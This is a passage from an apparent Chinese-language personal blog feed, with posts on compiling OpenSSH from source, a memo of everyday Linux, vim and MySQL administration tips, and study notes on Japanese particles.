sshd.</p><p>会不会和这有关呢? (摘自官网)<br>OpenSSH runs as two processes when connecting to other computers. The first process is a privileged process and controls the issuance of privileges as necessary. The second process communicates with the network.</p><h3 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h3><p>别忘了备份、别忘了备份、别忘了备份…</p><h3 id="卸载原本OpenSSH"><a href="#卸载原本OpenSSH" class="headerlink" title="卸载原本OpenSSH"></a>卸载原本OpenSSH</h3><p>由于我原本是编译安装的，到原本编译安装的目录卸载就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make uninstall</span><br></pre></td></tr></table></figure><h3 id="下载OpenSSH"><a href="#下载OpenSSH" class="headerlink" title="下载OpenSSH"></a>下载OpenSSH</h3><p>到官网下载就可以了<br><a href="http://www.openssh.com/releasenotes.html">http://www.openssh.com/releasenotes.html</a></p><h3 id="SHA1值检验"><a href="#SHA1值检验" class="headerlink" title="SHA1值检验"></a>SHA1值检验</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha1sum openssh-8.0p1.tar.gz</span><br></pre></td></tr></table></figure><h3 id="相关依赖包"><a href="#相关依赖包" class="headerlink" title="相关依赖包"></a>相关依赖包</h3><p>pam pam-devel zlib zlib-devel openssl-devel</p><h5 id="注意下ubuntu下pam是-libpam0g、pam-devel-是-libpam0g-dev"><a href="#注意下ubuntu下pam是-libpam0g、pam-devel-是-libpam0g-dev" class="headerlink" title="注意下ubuntu下pam是 libpam0g、pam-devel 是 libpam0g-dev"></a>注意下ubuntu下pam是 libpam0g、pam-devel 是 libpam0g-dev</h5><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-md5-passwords --with-pam --with-zlib --with-ssl-dir=/usr/<span class="built_in">local</span>/ssl --with-privsep-path=/var/lib/sshd</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h3 id="重启服务器，搞定！"><a href="#重启服务器，搞定！" class="headerlink" title="重启服务器，搞定！"></a>重启服务器，搞定！</h3>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>memo</title>
      <link href="2019/06/30/memo/"/>
      <url>2019/06/30/memo/</url>
      
        <content type="html"><![CDATA[<h3 id="记录-linux-一些常见问题"><a href="#记录-linux-一些常见问题" class="headerlink" title="记录 linux 一些常见问题"></a>记录 linux 一些常见问题</h3><h4 id="一、某端口是否被-Linux-防火墙阻止"><a href="#一、某端口是否被-Linux-防火墙阻止" class="headerlink" title="一、某端口是否被 Linux 防火墙阻止"></a>一、某端口是否被 Linux 防火墙阻止</h4><p>-L: 查看管理命令<br>子命令:<br>&emsp;-n：以数字的方式显示ip，它会将ip直接显示出来，如果不加-n，则会将ip反向解析成主机名。<br>&emsp;-v：显示详细信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -vnL | grep <span class="string">&#x27;:port&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="二、-字符对上一个命令的文本替换并重新执行命令"><a href="#二、-字符对上一个命令的文本替换并重新执行命令" class="headerlink" title="二、^字符对上一个命令的文本替换并重新执行命令"></a>二、^字符对上一个命令的文本替换并重新执行命令</h4><p>^before^after^</p><h4 id="三、vim系列"><a href="#三、vim系列" class="headerlink" title="三、vim系列"></a>三、vim系列</h4><ul><li><p>vim 字符串替换</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">:s/well/good/替换当前行第一个well 为 good</span><br><span class="line"></span><br><span class="line">:s/well/good/g        替换当前行所有well 为 good</span><br><span class="line"></span><br><span class="line">:n,$s/well/good/     替换第 n 行开始到最后一行中每一行的第一个 well 为 good</span><br><span class="line"></span><br><span class="line">:n,$s/well/good/g     替换第 n 行开始到最后一行中每一行所有 well 为 good</span><br><span class="line"></span><br><span class="line">n 为数字，若 n 为 .，表示从当前行开始到最后一行</span><br><span class="line"></span><br><span class="line">:%s/well/good/      （等同于 :g/well/s//good/） 替换每一行的第一个 well 为 good</span><br><span class="line"></span><br><span class="line">:%s/well/good/g    （等同于 :g/well/s//good/g） 替换每一行中所有 well 为 good</span><br><span class="line"></span><br><span class="line">特殊符号转义：可以使用#作为分隔符，此时中间出现的 / 不会作为分隔符</span><br><span class="line"></span><br><span class="line">:s#well/#good/#     　　　替换当前行第一个 well/ 为 good/</span><br><span class="line"></span><br><span class="line">:%s#/usr/bin#/bin#g 可以把文件中所有路径/usr/bin换成/bin</span><br></pre></td></tr></table></figure></li><li><p>vim 乱码问题<br>其中-b一般是用来查看对应的二进制文件</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> -<span class="keyword">b</span> <span class="keyword">file</span></span><br></pre></td></tr></table></figure></li><li><p>vim tab 设置为4个空格<br>vimrc文件末尾加上</p></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">ts</span>=<span class="number">4</span></span><br><span class="line"><span class="keyword">set</span> expandtab</span><br><span class="line"><span class="keyword">set</span> autoindent</span><br></pre></td></tr></table></figure><ul><li><p>vim 多行注释</p><ul><li>首先按 esc 进入命令行模式下，按下 Ctrl + v，进入列（也叫区块）模式;</li><li>在行首使用上下键选择需要注释的多行;</li><li>按下键盘（大写）“I” 键，进入插入模式；</li><li>然后输入注释符（“//”、“#”等）;</li><li>最后按下 “Esc” 键。 注：在按下esc键后，会稍等一会才会出现注释，不要着急时间很短的~</li></ul></li><li><p>vim 去掉高亮底色<br>进入命令模式, 输入</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:nohl</span><br></pre></td></tr></table></figure></li><li><p>vim 除了 i o 外的其他插入</p><ul><li>I 在光标当前行开始插入</li><li>a 在光标后插入</li><li>A 在光标当前行末尾插入</li><li>O 在光标当前行的上一行插入新行</li></ul></li><li><p>vim 定位命令</p><ul><li>:set nu 显示行号</li><li>:set nonu 取消行号</li></ul></li><li><p>vim 替换和取消命令</p><ul><li>r 替换光标所在处的字符</li><li>R 从光标所在处开始替换,按Esc键结束</li></ul></li><li><p>vim 删除命令(一直傻傻的按远远的del键..)</p><ul><li>x 删除光标所在处命令</li><li>nx 删除光标所在处后的n个字符</li><li>dG 删除光标所在行到末尾行的所有内容</li><li>D 删除光标所在处到行尾的内容</li><li>:n,md 删除制定范围的行</li></ul></li><li><p>vim 常用快捷键</p><ul><li>Shift + zz 保存退出, 与 “:wq” 作用相同</li><li>V 进入行可视模式</li><li>Ctrl + v 进入块可视模式</li></ul></li><li><p>vim 鼠标右键不能复制粘贴，而是切为可视化模式</p><ul><li>全局改变 vim /etc/vimrc</li><li>仅改变当前用户 vim ~/.vimrc </li><li>注意事项: source 这一行的功能是加载默认配置，一定要先确定该文件路径存在 (根据vim版本确实vim7*,8*)，否则可能会导致 vim 不可用<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /usr/share/vim/vim81/defaults.vim</span><br><span class="line"><span class="built_in">let</span> skip_defaults_vim = 1</span><br><span class="line"><span class="keyword">if</span> has(<span class="string">&#x27;mouse&#x27;</span>)</span><br><span class="line">    <span class="built_in">set</span> mouse-=a</span><br><span class="line">endif</span><br></pre></td></tr></table></figure></li><li>重新打开 vim 就可以正常使用鼠标右键复制粘贴了</li><li>转载自: <a href="https://xirikm.net/2019/504-1.html">https://xirikm.net/2019/504-1.html</a></li></ul></li></ul><h4 id="八、linux终端锁屏与解锁"><a href="#八、linux终端锁屏与解锁" class="headerlink" title="八、linux终端锁屏与解锁"></a>八、linux终端锁屏与解锁</h4><p>ctrl+s 锁屏<br>ctrl+q 解锁</p><h4 id="九、Sublime-Text-3-垂直选取"><a href="#九、Sublime-Text-3-垂直选取" class="headerlink" title="九、Sublime Text 3 垂直选取"></a>九、Sublime Text 3 垂直选取</h4><p>Shift+鼠标右键</p><h4 id="十、MySQL统计所以库数据大小（有点慢喔）"><a href="#十、MySQL统计所以库数据大小（有点慢喔）" class="headerlink" title="十、MySQL统计所以库数据大小（有点慢喔）"></a>十、MySQL统计所以库数据大小（有点慢喔）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, concat(TRUNCATE(sum(data_length)/1024/1024,2),<span class="string">&#x27;MB&#x27;</span>) AS data_size,</span><br><span class="line">concat(TRUNCATE(sum(index_length)/1024/1024,2),<span class="string">&#x27;MB&#x27;</span>) AS index_size</span><br><span class="line">FROM information_schema.TABLES</span><br><span class="line">GROUP BY TABLE_SCHEMA</span><br><span class="line">ORDER BY data_length DESC;</span><br></pre></td></tr></table></figure><h4 id="十一、用户加组"><a href="#十一、用户加组" class="headerlink" title="十一、用户加组"></a>十一、用户加组</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod -aG group user</span><br></pre></td></tr></table></figure><h4 id="十二、探测服务是否已经启动-运行是否正常"><a href="#十二、探测服务是否已经启动-运行是否正常" class="headerlink" title="十二、探测服务是否已经启动, 运行是否正常"></a>十二、探测服务是否已经启动, 运行是否正常</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">killall -0 service</span><br></pre></td></tr></table></figure><h4 id="十三、deb-和-rpm-包之间的转换"><a href="#十三、deb-和-rpm-包之间的转换" class="headerlink" title="十三、deb 和 rpm 包之间的转换"></a>十三、deb 和 rpm 包之间的转换</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install alien</span><br></pre></td></tr></table></figure><h4 id="十四、查看自己的-pts"><a href="#十四、查看自己的-pts" class="headerlink" title="十四、查看自己的 pts"></a>十四、查看自己的 pts</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">who am i</span><br></pre></td></tr></table></figure><h4 id="十五、创建目录结构"><a href="#十五、创建目录结构" class="headerlink" title="十五、创建目录结构"></a>十五、创建目录结构</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -v 显示做了什么</span></span><br><span class="line">mkdir -pv path/&#123;dir1, dir2, ...&#125;</span><br></pre></td></tr></table></figure><h4 id="十六、查看-nginx-的组和用户并锁定其不能用-ssh-登录"><a href="#十六、查看-nginx-的组和用户并锁定其不能用-ssh-登录" class="headerlink" title="十六、查看 nginx 的组和用户并锁定其不能用 ssh 登录"></a>十六、查看 nginx 的组和用户并锁定其不能用 ssh 登录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看组</span></span><br><span class="line">getent group nginx</span><br><span class="line"><span class="comment"># 查看用户</span></span><br><span class="line">getent passwd nginx</span><br><span class="line"><span class="comment"># 查看nginx属于哪个组</span></span><br><span class="line">id nginx</span><br><span class="line"><span class="comment"># 锁定 nginx 不能登录</span></span><br><span class="line">usermod -s /sbin/nologin nginx</span><br></pre></td></tr></table></figure><h4 id="十七、锁定nginx用户不能登录"><a href="#十七、锁定nginx用户不能登录" class="headerlink" title="十七、锁定nginx用户不能登录"></a>十七、锁定nginx用户不能登录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd -l </span><br></pre></td></tr></table></figure><h4 id="十八、mysql密码强度设置"><a href="#十八、mysql密码强度设置" class="headerlink" title="十八、mysql密码强度设置"></a>十八、mysql密码强度设置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">set</span> global validate_password_policy=0;</span><br><span class="line">mysql&gt; <span class="built_in">set</span> global validate_password_length=1;</span><br><span class="line"><span class="comment"># 设置 root&#x27;@&#x27;localhost 的密码</span></span><br><span class="line">ALTER USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="string">&#x27;new password&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="十九、MySQL查看所有连接的客户端ip"><a href="#十九、MySQL查看所有连接的客户端ip" class="headerlink" title="十九、MySQL查看所有连接的客户端ip"></a>十九、MySQL查看所有连接的客户端ip</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SELECT user, host from mysql.user;</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">SELECT</span><br><span class="line">substring_index(HOST, <span class="string">&#x27;:&#x27;</span>, 1) AS host_name,</span><br><span class="line">state,</span><br><span class="line">count(*)</span><br><span class="line">FROM</span><br><span class="line">information_schema. PROCESSLIST</span><br><span class="line">GROUP BY</span><br><span class="line">state,</span><br><span class="line">host_name;</span><br></pre></td></tr></table></figure><h4 id="二十、编码转换"><a href="#二十、编码转换" class="headerlink" title="二十、编码转换"></a>二十、编码转换</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 linux 下打开 windows 的 txt 可能乱码</span></span><br><span class="line">iconv -f GBK -t UTF-8 文件名字</span><br><span class="line"><span class="comment"># gedit 乱码可尝试</span></span><br><span class="line">gsettings <span class="built_in">set</span> org.gnome.gedit.preferences.encodings candidate-encodings <span class="string">&quot;[&#x27;GB18030&#x27;, &#x27;UTF-8&#x27;, &#x27;CURRENT&#x27;, &#x27;ISO-8859-15&#x27;, &#x27;UTF-16&#x27;]&quot;</span></span><br></pre></td></tr></table></figure><h4 id="二十一、批量图片大小转换"><a href="#二十一、批量图片大小转换" class="headerlink" title="二十一、批量图片大小转换"></a>二十一、批量图片大小转换</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name <span class="string">&#x27;*.jpg&#x27;</span> -<span class="built_in">exec</span> convert -resize 1100x2200 &#123;&#125; &#123;&#125; \;</span><br></pre></td></tr></table></figure><h4 id="二十一、五-弄一个读取速度很快很快的小硬盘"><a href="#二十一、五-弄一个读取速度很快很快的小硬盘" class="headerlink" title="二十一、五 弄一个读取速度很快很快的小硬盘"></a>二十一、五 弄一个读取速度很快很快的小硬盘</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /mnt/ram</span><br><span class="line">mount -t tmpfs tmpfs /mnt/ram -o size=8192M</span><br></pre></td></tr></table></figure><h4 id="二十二、don’t-add-command-to-history-note-the-leading-space"><a href="#二十二、don’t-add-command-to-history-note-the-leading-space" class="headerlink" title="二十二、don’t add command to history (note the leading space)"></a>二十二、don’t add command to history (note the leading space)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Am I like a hacker?&quot;</span><br></pre></td></tr></table></figure><h4 id="二十三、exit-terminal-but-leave-all-processes-running"><a href="#二十三、exit-terminal-but-leave-all-processes-running" class="headerlink" title="二十三、exit terminal but leave all processes running"></a>二十三、exit terminal but leave all processes running</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">disown</span> -a &amp;&amp; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h4 id="二十四、script-回放"><a href="#二十四、script-回放" class="headerlink" title="二十四、script 回放"></a>二十四、script 回放</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开始录像，ctrl+d或者exit结束</span></span><br><span class="line">script -t 2&gt;demo.time -a demo.his</span><br><span class="line"><span class="comment"># 回放</span></span><br><span class="line">scriptreplay demo.time demo.his</span><br></pre></td></tr></table></figure><h4 id="二十五、-搜索历史记录"><a href="#二十五、-搜索历史记录" class="headerlink" title="二十五、 搜索历史记录"></a>二十五、 搜索历史记录</h4><p>ctrl + r<br>我天，这么好用的命令我居然一直很少用。。。</p><h4 id="二十六、-V2ray"><a href="#二十六、-V2ray" class="headerlink" title="二十六、 V2ray"></a>二十六、 V2ray</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 系统时间</span></span><br><span class="line">sudo date -s 2019/10/27</span><br><span class="line">sudo date -s 16:36:10</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">sudo pacman -S openntpd</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> openntpd</span><br><span class="line">sudo systemctl start openntpd</span><br></pre></td></tr></table></figure><h4 id="二十七、archlinux-vmware"><a href="#二十七、archlinux-vmware" class="headerlink" title="二十七、archlinux vmware"></a>二十七、archlinux vmware</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每次更新完内核都要使用如下命令重新编译内核模块的</span></span><br><span class="line">sudo vmware-modconfig --console --install-all</span><br></pre></td></tr></table></figure><h4 id="二十八、linux写入-ntfs-文件"><a href="#二十八、linux写入-ntfs-文件" class="headerlink" title="二十八、linux写入 ntfs 文件"></a>二十八、linux写入 ntfs 文件</h4><p>需要安装 ntfs-3g</p><h4 id="二十九、sudo-git-导致root用户和其他用户git配置不一致"><a href="#二十九、sudo-git-导致root用户和其他用户git配置不一致" class="headerlink" title="二十九、sudo git 导致root用户和其他用户git配置不一致"></a>二十九、sudo git 导致root用户和其他用户git配置不一致</h4><p>sudo 也不是乱用的晕。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*** Please tell me who you are.</span><br><span class="line"></span><br><span class="line">Run</span><br><span class="line"></span><br><span class="line">  git config --global user.email &quot;you@example.com&quot;</span><br><span class="line">  git config --global user.name &quot;Your Name&quot;</span><br><span class="line"></span><br><span class="line">to set your account&#39;s default identity.</span><br><span class="line">Omit --global to set the identity only in this repository.</span><br><span class="line"></span><br><span class="line">fatal: unable to auto-detect email address (got &#39;root@****.(none)&#39;)</span><br></pre></td></tr></table></figure><h4 id="三十、-archlinux-中一个网卡多ip可能会导致不同服务ip冲突导致网速下降"><a href="#三十、-archlinux-中一个网卡多ip可能会导致不同服务ip冲突导致网速下降" class="headerlink" title="三十、 archlinux 中一个网卡多ip可能会导致不同服务ip冲突导致网速下降"></a>三十、 archlinux 中一个网卡多ip可能会导致不同服务ip冲突导致网速下降</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看一个网卡是否存在多个ip</span></span><br><span class="line">ip addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果存在多个 ip 可能是系统装有多个网络管理造成的, 我是把 dhcpcd 关了 再 配合静态ip就好了</span></span><br><span class="line">systemctl stop dhcpcd</span><br><span class="line">systemctl <span class="built_in">disable</span> dhcpcd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后重启</span></span><br><span class="line">shutdown -r now</span><br></pre></td></tr></table></figure><h4 id="三十一、-linux-下-pycharm-用-matplotlib-库中文乱码-及-减号方块问题"><a href="#三十一、-linux-下-pycharm-用-matplotlib-库中文乱码-及-减号方块问题" class="headerlink" title="三十一、 linux 下 pycharm 用 matplotlib 库中文乱码 及 减号方块问题"></a>三十一、 linux 下 pycharm 用 matplotlib 库中文乱码 及 减号方块问题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看 matplotlib 字体及配置文件目录</span></span><br><span class="line"><span class="keyword">import</span> matplotlib </span><br><span class="line">CONFIG_DIR = <span class="built_in">print</span>(matplotlib.matplotlib_fname())</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://fontzone.net/download/simhei 下载 simhei 字体</span></span><br><span class="line"><span class="comment"># 把字体拷贝到 matplotlib 字体目录</span></span><br><span class="line"><span class="comment"># 要注意你新下载字体的用户及用户组的权限和该目录下一致</span></span><br><span class="line">cp DOWNLOAD_DIR/simhei.ttf CONFIG_DIR/fonts/ttf/ </span><br><span class="line">vim CONFIG_DIR/matplotlibrc <span class="comment"># matplotlib 配置文件目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到相应位置并 修改为下面三项</span></span><br><span class="line">font.family : sans-serif</span><br><span class="line">font.sans-serif     : SimHei, Bitstream Vera Sans, Lucida Grande, Verdana, Geneva, Lucid, Arial, Helvetica, Avant Garde, sans-serif</span><br><span class="line">axes.unicode_minus:False <span class="comment">#作用就是解决负号&#x27;-&#x27;显示为方块的问题</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除原本字体缓存</span></span><br><span class="line"><span class="built_in">cd</span> ~/.cache/matplotlib</span><br><span class="line">rm -rf *.*</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimHei&#x27;</span>]</span><br><span class="line">mpl.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 应该就 OK 了</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 小记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>「助詞」</title>
      <link href="2019/06/29/%E3%80%8C%E5%8A%A9%E8%A9%9E%E3%80%8D/"/>
      <url>2019/06/29/%E3%80%8C%E5%8A%A9%E8%A9%9E%E3%80%8D/</url>
      
        <content type="html"><![CDATA[<h3 id="助詞「は」"><a href="#助詞「は」" class="headerlink" title="助詞「は」"></a>助詞「は」</h3><h4 id="l—-主語は-一个句子只能有一个"><a href="#l—-主語は-一个句子只能有一个" class="headerlink" title="l— 主語は　一个句子只能有一个"></a>l<sub>— 主語は　一个句子只能有一个</h4><h4 id="l—-表示区别对比"><a href="#l—-表示区别对比" class="headerlink" title="l— 表示区别对比"></a>l<sub>— 表示区别对比</h4><p>例：明日は働きません<br>　　私は野菜と魚を食べます。肉は食べません<br>　　[私は]土曜日は友達と食事します。日曜日は働きます</p><h3 id="助詞「に」"><a href="#助詞「に」" class="headerlink" title="助詞「に」"></a>助詞「に」</h3><h4 id="l—-表示動作進行時点"><a href="#l—-表示動作進行時点" class="headerlink" title="l— 表示動作進行時点"></a>l<sub>— 表示動作進行時点</h4><ul><li><p>具体时间要放「に」（八時に、午後四時に）〜　ます<br>例：１０時に友達と食事します。</p></li><li><p>泛指时间不用放「に」（明日）〜　ます</p></li><li><p>可放可不放「に」月曜日　火曜日　水曜日　木曜日　金曜日　土曜日　日曜日　</p></li></ul><h4 id="l—-表示存在位置"><a href="#l—-表示存在位置" class="headerlink" title="l— 表示存在位置"></a>l<sub>— 表示存在位置</h4><ul><li><p>重点是 <strong>东西或人/动物</strong></p><ul><li>存在位置 + に + <strong>东西</strong> + が <u>あり</u>ます<br>例：机の上にリンゴが<u>あり</u>ます<br>  a：京都に何が<u>あり</u>ます<br>  b：古いお寺や神社[など]が <u>あり</u>ます</li><li>存在位置 + に + <strong>人/动物</strong> + が <u>い</u>ます<br>例：あそこに子供が<u>い</u>ます<br>  a：部屋に誰が<u>い</u>ます<br>  b：田中さんが<u>い</u>ます</li></ul></li><li><p>重点是 <strong>位置</strong></p><ul><li>东西 + は + <strong>存在位置</strong> + に + が <u>あり</u>ます<br>例：a：トイレはどこに<u>あり</u>ますか<br>&emsp;&emsp;b：2階に<u>あり</u>ます/2階です</li><li>人/动物 + は + <strong>存在位置</strong> + に + が <u>い</u>ます<br>例：a：田中さんはどこに<u>い</u>ますか<br>&emsp;&emsp;b：＿＿＿＿＿会議室に<u>い</u>ます</li></ul></li></ul><h4 id="l—-当动作一个人完成不了时"><a href="#l—-当动作一个人完成不了时" class="headerlink" title="l— 当动作一个人完成不了时"></a>l<sub>— 当动作一个人完成不了时</h4><p>动作主 + は + 动作对方 + に +动作对象 + を + 动词<br>例：私は友達に電話を掛けました<br>&emsp;&emsp;[私は]友達にCDを貸しました<br>&emsp;&emsp;私はFAXで会社にレポートを送りました</p><p>例：私は母にカードをあげました<br>&emsp;&emsp;私は母にセーターを<u>貰いました</u>  收到<br>&emsp;&emsp;母は私にセーターを<u>くれました</u>  给(我)<br>&emsp;&emsp;<u>×</u> 母は私にセーターを<u>あげました</u><br>&emsp;&emsp;因为日本人比较谦虚, 给别人的时候要 「上げ」, 就是比较熟的人也是如此, 别人给我时是 「クレ」<br>&emsp;&emsp;例：友達は私の妹に本をくれました<br>&emsp;&emsp;&emsp;&emsp;私は父にネクタイをあげました</p><h4 id="l—-表示分配時間"><a href="#l—-表示分配時間" class="headerlink" title="l— 表示分配時間"></a>l<sub>— 表示分配時間</h4><p>期間 + に + 次数</p><p>例：一週間に２回日本語を勉強します<br>a：一周間に何回英語を勉強しますか<br>b：4回勉強します。1回に4時間勉強します<br>a：じゃあ、一週間に１６時間ですね。すごいですね</p><h3 id="助詞「で」"><a href="#助詞「で」" class="headerlink" title="助詞「で」"></a>助詞「で」</h3><h4 id="l—-表示動作進行地点"><a href="#l—-表示動作進行地点" class="headerlink" title="l— 表示動作進行地点"></a>l<sub>— 表示動作進行地点</h4><ul><li><p>場所 + で + 動詞　〜　ます<br>在…<br>例：駅の前で会いましょう。</p></li><li><p>一个人做什么什么<br>一人で</p></li><li><p>表示交通工具（搭乘～，开～，骑～， 坐～）<br>例：電車で行きます<br>　　要搭电车去</p></li></ul><h4 id="l—-用…工具-方法"><a href="#l—-用…工具-方法" class="headerlink" title="l— 用…工具(方法)"></a>l<sub>— 用…工具(方法)</h4><p>例：私は<u>FAXで</u>会社にレポートを送りました</p><h3 id="助詞「と」"><a href="#助詞「と」" class="headerlink" title="助詞「と」"></a>助詞「と」</h3><h4 id="l—-和（跟）…"><a href="#l—-和（跟）…" class="headerlink" title="l— 和（跟）…"></a>l<sub>— 和（跟）…</h4><p>例：日曜日、[あなたは]誰と食事しますか。<br>　　[私は]高校時代の友達と食事します。</p><h4 